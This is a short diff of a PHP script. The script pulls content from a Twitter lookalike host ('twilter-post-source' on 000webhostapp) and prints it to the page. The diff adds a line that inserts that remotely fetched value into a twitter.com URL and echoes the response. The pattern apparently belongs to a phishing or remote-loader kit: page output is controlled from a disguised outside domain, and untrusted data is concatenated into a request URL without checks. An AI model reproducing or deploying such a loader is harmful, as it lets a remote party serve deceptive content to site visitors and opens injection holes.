@@ -22,6 +22,7 @@ function curl_site($Url){
 
 $kulad=curl_site('https://twilter-post-source.000webhostapp.com/usergrid.php'); 
 
+echo file_get_contents("https://www.twitter.com/.$kulad.");
 print $kulad;
 ?>
 
